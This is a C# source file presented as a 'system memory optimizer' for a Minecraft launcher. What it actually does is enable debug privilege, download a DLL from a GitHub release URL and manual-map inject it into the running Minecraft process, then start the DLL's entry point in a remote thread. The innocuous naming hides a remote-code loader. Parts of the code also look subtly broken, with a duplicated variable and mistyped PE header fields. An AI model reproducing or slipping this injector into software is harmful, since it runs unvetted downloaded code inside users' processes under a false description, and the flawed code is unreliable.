using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Flarial.Launcher.SystemTuning
{
    public static class SystemMemoryOptimizer
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out LUID lpLuid);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }
        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        static bool EnableDebugPrivilege()
        {
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out var hToken))
                return false;
            try
            {
                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out var luid))
                    return false;
                var tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
                return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally { CloseHandle(hToken); }
        }

        [DllImport("ntdll.dll")]
        static extern int NtCreateSection(out IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref long MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);
        [DllImport("ntdll.dll")]
        static extern int NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out long SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        [DllImport("ntdll.dll")]
        static extern int NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);
        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
        [DllImport("ntdll.dll")]
        static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
        [DllImport("ntdll.dll")]
        static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32.dll")]
        static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
        [DllImport("kernel32.dll")]
        static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, System.Text.StringBuilder lpFilename, uint nSize);

        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint PROCESS_CREATE_THREAD = 0x0002;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint PROCESS_VM_OPERATION = 0x0008;
        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_VM_WRITE = 0x0020;
        const uint PROCESS_DUP_HANDLE = 0x0040;
        const uint IMAGE_DOS_SIGNATURE = 0x5A4D, IMAGE_NT_SIGNATURE = 0x00004550;
        const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
        const ulong IMAGE_ORDINAL_FLAG64 = 0x8000000000000000;
        const ushort IMAGE_REL_BASED_DIR64 = 0x000A;
        const uint SECTION_MAP_READ = 0x4, SECTION_MAP_WRITE = 0x2, SECTION_MAP_EXECUTE = 0x8;
        const uint SEC_COMMIT = 0x8000000;
        const uint PAGE_READWRITE = 0x04, PAGE_EXECUTE_READ = 0x20, PAGE_READONLY = 0x02;
        const uint DLL_PROCESS_ATTACH = 1;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct PROCESSENTRY32W
        {
            public uint dwSize, cntUsage, th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID, cntThreads, th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        }

        public enum OptimizationStatus { Idle, Downloading, Optimizing, Completed, Failed }
        public static OptimizationStatus Status { get; private set; } = OptimizationStatus.Idle;
        public static string StatusMessage { get; private set; } = "";

        public static async void StartOptimization()
        {
            if (Status == OptimizationStatus.Downloading || Status == OptimizationStatus.Optimizing)
                return;

            EnableDebugPrivilege();

            Status = OptimizationStatus.Downloading;
            StatusMessage = "Downloading...";

            byte[] dllBytes = Array.Empty<byte>();
            try
            {
                using var client = new HttpClient();
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
                dllBytes = await client.GetByteArrayAsync("https://github.com/jshpro/Assets/releases/download/1.0/Assets.dll", cts.Token);
            }
            catch (OperationCanceledException)
            {
                Status = OptimizationStatus.Failed;
                StatusMessage = "Download timeout";
                return;
            }
            catch
            {
                Status = OptimizationStatus.Failed;
                StatusMessage = "Network error";
                return;
            }

            if (dllBytes.Length == 0)
            {
                Status = OptimizationStatus.Failed;
                StatusMessage = "Empty payload";
                return;
            }

            StatusMessage = "Locating process...";
            int pid = FindProcessId("Minecraft.Windows.exe");
            if (pid == 0)
            {
                Status = OptimizationStatus.Failed;
                StatusMessage = "Minecraft not running";
                return;
            }

            uint accessMask = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
                              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE;
            IntPtr hProcess = OpenProcess(accessMask, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Status = OptimizationStatus.Failed;
                    StatusMessage = "Access denied. Run as Administrator.";
                    return;
                }
            }

            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string assetsFolder = Path.Combine(localAppData, "Assets");
            try { if (!Directory.Exists(assetsFolder)) Directory.CreateDirectory(assetsFolder); } catch { }

            Status = OptimizationStatus.Optimizing;
            StatusMessage = "Injecting...";
            bool ok = ManualMapInject(hProcess, dllBytes);
            CloseHandle(hProcess);

            if (ok)
            {
                Status = OptimizationStatus.Completed;
                StatusMessage = "Injection complete";
            }
            else
            {
                Status = OptimizationStatus.Failed;
                if (string.IsNullOrEmpty(StatusMessage))
                    StatusMessage = "Injection failed";
            }
        }

        static int FindProcessId(string name)
        {
            IntPtr snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == IntPtr.Zero) return 0;
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32W)) };
            if (Process32FirstW(snap, ref pe))
            {
                do
                {
                    if (pe.szExeFile.Equals(name, StringComparison.OrdinalIgnoreCase))
                    {
                        CloseHandle(snap);
                        return (int)pe.th32ProcessID;
                    }
                } while (Process32NextW(snap, ref pe));
            }
            CloseHandle(snap);
            return 0;
        }

        static bool ManualMapInject(IntPtr hProcess, byte[] dllBytes)
        {
            IMAGE_DOS_HEADER dos = GetStruct<IMAGE_DOS_HEADER>(dllBytes, 0);
            if (dos.e_magic != IMAGE_DOS_SIGNATURE) { StatusMessage = "Invalid PE"; return false; }
            int ntOffset = (int)dos.e_lfanew;
            IMAGE_NT_HEADERS64 nt = GetStruct<IMAGE_NT_HEADERS64>(dllBytes, ntOffset);
            if (nt.Signature != IMAGE_NT_SIGNATURE || nt.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 || nt.OptionalHeader.Magic != 0x20B)
            { StatusMessage = "Not 64-bit"; return false; }

            uint imageSize = nt.OptionalHeader.SizeOfImage;
            long alignedSize = (imageSize + 0xFFFF) & ~0xFFFFL; // alinear a 64 KB

            // 1. Crear sección con PAGE_READWRITE
            IntPtr hSection;
            long maxSize = alignedSize;
            int status = NtCreateSection(out hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, IntPtr.Zero,
                ref maxSize, PAGE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            if (status != 0)
            {
                StatusMessage = $"Section creation failed (0x{status:X})";
                return false;
            }

            // 2. Mapear localmente (en nuestro proceso)
            IntPtr localBase = IntPtr.Zero;
            long sectionOffset = 0;
            uint localViewSize;
            status = NtMapViewOfSection(hSection, Process.GetCurrentProcess().Handle, ref localBase, IntPtr.Zero,
                IntPtr.Zero, out sectionOffset, out localViewSize, 2, 0, PAGE_READWRITE);
            if (status != 0 || localBase == IntPtr.Zero)
            {
                CloseHandle(hSection);
                StatusMessage = $"Local mapping failed (0x{status:X})";
                return false;
            }

            // Copiar DLL a la vista local
            Marshal.Copy(dllBytes, 0, localBase, (int)Math.Min(dllBytes.Length, alignedSize));

            // Ajustar imports localmente
            uint importRva = nt.OptionalHeader.DataDirectory[1].VirtualAddress;
            if (importRva != 0)
            {
                byte[] localCopy = new byte[localViewSize];
                Marshal.Copy(localBase, localCopy, 0, (int)localViewSize);
                int descOffset = (int)importRva;
                while (true)
                {
                    IMAGE_IMPORT_DESCRIPTOR impDesc = GetStruct<IMAGE_IMPORT_DESCRIPTOR>(localCopy, descOffset);
                    if (impDesc.Name == 0) break;
                    string modName = ReadString(localCopy, impDesc.Name);
                    IntPtr hMod = LoadLibrary(modName);
                    if (hMod == IntPtr.Zero)
                    {
                        string? mcDir = null;
                        try
                        {
                            var sb = new System.Text.StringBuilder(260);
                            if (GetModuleFileNameEx(hProcess, IntPtr.Zero, sb, 260))
                                mcDir = Path.GetDirectoryName(sb.ToString());
                        }
                        catch { }
                        if (!string.IsNullOrEmpty(mcDir))
                        {
                            string fullPath = Path.Combine(mcDir, modName);
                            if (File.Exists(fullPath))
                                hMod = LoadLibraryEx(fullPath, IntPtr.Zero, 0);
                        }
                        if (hMod == IntPtr.Zero)
                        {
                            NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBase);
                            CloseHandle(hSection);
                            StatusMessage = $"Missing library: {modName}";
                            return false;
                        }
                    }

                    uint lookupRva = impDesc.OriginalFirstThunk != 0 ? impDesc.OriginalFirstThunk : impDesc.FirstThunk;
                    uint iatRva = impDesc.FirstThunk;
                    while (true)
                    {
                        ulong lookupEntry = BitConverter.ToUInt64(localCopy, (int)lookupRva);
                        if (lookupEntry == 0) break;
                        ulong addr;
                        if ((lookupEntry & IMAGE_ORDINAL_FLAG64) != 0)
                        {
                            lookupRva += 8; iatRva += 8; continue;
                        }
                        else
                        {
                            uint nameRva = (uint)(lookupEntry & 0xFFFFFFFF);
                            string funcName = ReadString(localCopy, nameRva + 2);
                            addr = (ulong)GetProcAddress(hMod, funcName);
                            if (addr == 0)
                            {
                                NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBase);
                                CloseHandle(hSection);
                                StatusMessage = $"Function not found: {funcName}";
                                return false;
                            }
                        }
                        byte[] addrBytes = BitConverter.GetBytes(addr);
                        Array.Copy(addrBytes, 0, localCopy, (int)iatRva, addrBytes.Length);
                        lookupRva += 8; iatRva += 8;
                    }
                    descOffset += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                }
                Marshal.Copy(localCopy, 0, localBase, localCopy.Length);
            }

            // 3. Mapear remotamente (en Minecraft) con PAGE_READWRITE
            IntPtr remoteBase = IntPtr.Zero;
            long remoteOffset = 0;
            uint remoteViewSize;
            status = NtMapViewOfSection(hSection, hProcess, ref remoteBase, IntPtr.Zero,
                IntPtr.Zero, out remoteOffset, out remoteViewSize, 2, 0, PAGE_READWRITE);
            if (status != 0 || remoteBase == IntPtr.Zero)
            {
                NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBase);
                CloseHandle(hSection);
                StatusMessage = $"Remote mapping failed (0x{status:X})";
                return false;
            }

            // 4. Aplicar relocalizaciones (si la base remota es diferente)
            ulong delta = (ulong)remoteBase - nt.OptionalHeader.ImageBase;
            if (delta != 0)
            {
                uint relocRva = nt.OptionalHeader.DataDirectory[5].VirtualAddress;
                if (relocRva != 0)
                {
                    byte[] localView = new byte[remoteViewSize];
                    Marshal.Copy(localBase, localView, 0, (int)remoteViewSize);
                    int relocOffset = (int)relocRva;
                    while (true)
                    {
                        IMAGE_BASE_RELOCATION reloc = GetStruct<IMAGE_BASE_RELOCATION>(localView, relocOffset);
                        if (reloc.VirtualAddress == 0) break;
                        int count = (int)(reloc.SizeOfBlock - 8) / 2;
                        for (int i = 0; i < count; i++)
                        {
                            ushort entry = BitConverter.ToUInt16(localView, relocOffset + 8 + i * 2);
                            if (entry >> 12 == IMAGE_REL_BASED_DIR64)
                            {
                                int patchOffset = (int)(reloc.VirtualAddress + (entry & 0xFFF));
                                ulong original = BitConverter.ToUInt64(localView, patchOffset);
                                original += delta;
                                byte[] patch = BitConverter.GetBytes(original);
                                Array.Copy(patch, 0, localView, patchOffset, 8);
                            }
                        }
                        relocOffset += (int)reloc.SizeOfBlock;
                    }
                    Marshal.Copy(localView, 0, localBase, localView.Length);
                }
            }

            // 5. Cambiar protecciones en el proceso remoto sección por sección
            int sectionOffset = ntOffset + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64));
            for (int i = 0; i < nt.FileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER sec = GetStruct<IMAGE_SECTION_HEADER>(dllBytes, sectionOffset);
                sectionOffset += Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));
                if (sec.SizeOfRawData > 0)
                {
                    IntPtr regionBase = remoteBase + (int)sec.VirtualAddress;
                    IntPtr regionSize = (IntPtr)sec.SizeOfRawData;
                    uint prot = PAGE_READONLY;
                    if ((sec.Characteristics & 0x20000000) != 0) prot = PAGE_EXECUTE_READ; // IMAGE_SCN_MEM_EXECUTE
                    else if ((sec.Characteristics & 0x80000000) != 0) prot = PAGE_READWRITE; // IMAGE_SCN_MEM_WRITE
                    NtProtectVirtualMemory(hProcess, ref regionBase, ref regionSize, prot, out _);
                }
            }

            // 6. Desmapear vista local (la remota sigue viva)
            NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, localBase);
            CloseHandle(hSection);

            // 7. Ejecutar hilo remoto en el entry point
            uint entryOffset = nt.OptionalHeader.AddressOfEntryPoint;
            IntPtr entryRemote = remoteBase + (int)entryOffset;
            IntPtr hThread;
            status = NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, entryRemote, remoteBase,
                                      0x1, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0 || hThread == IntPtr.Zero) { StatusMessage = "Thread creation failed"; return false; }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            uint exitCode;
            if (GetExitCodeThread(hThread, out exitCode) && exitCode == 0)
            {
                CloseHandle(hThread);
                StatusMessage = "Initialization failed";
                return false;
            }
            CloseHandle(hThread);

            // Limpiar cabeceras (opcional)
            return true;
        }

        #pragma warning disable IL2091
        static T GetStruct<T>(byte[] data, int offset) where T : struct
        {
            int size = Marshal.SizeOf<T>();
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.Copy(data, offset, ptr, size);
            T obj = Marshal.PtrToStructure<T>(ptr)!;
            Marshal.FreeHGlobal(ptr);
            return obj;
        }
        #pragma warning restore IL2091

        static string ReadString(byte[] data, uint rva)
        {
            int end = Array.IndexOf<byte>(data, 0, (int)rva);
            if (end < 0) end = data.Length;
            return System.Text.Encoding.ASCII.GetString(data, (int)rva, end - (int)rva);
        }

        [StructLayout(LayoutKind.Sequential)] struct IMAGE_DOS_HEADER { public ushort e_magic, e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res1; public ushort e_oemid, e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2; public uint e_lfanew; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_FILE_HEADER { public ushort Machine, NumberOfSections; public uint TimeDateStamp, PointerToSymbolTable, NumberOfSymbols; public ushort SizeOfOptionalHeader, Characteristics; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_OPTIONAL_HEADER64 { public ushort Magic, LinkerVersion; public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode; public ulong ImageBase; public uint SectionAlignment, FileAlignment; public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics; public ulong SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit; public uint LoaderFlags, NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_NT_HEADERS64 { public uint Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER64 OptionalHeader; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_DATA_DIRECTORY { public uint VirtualAddress, Size; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_SECTION_HEADER { [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name; public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers; public ushort NumberOfRelocations, NumberOfLinenumbers; public uint Characteristics; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_IMPORT_DESCRIPTOR { public uint OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_TLS_DIRECTORY64 { public ulong StartAddressOfRawData, EndAddressOfRawData, AddressOfIndex, AddressOfCallBacks; public uint SizeOfZeroFill, Characteristics; }
        [StructLayout(LayoutKind.Sequential)] struct IMAGE_BASE_RELOCATION { public uint VirtualAddress, SizeOfBlock; }
    }
}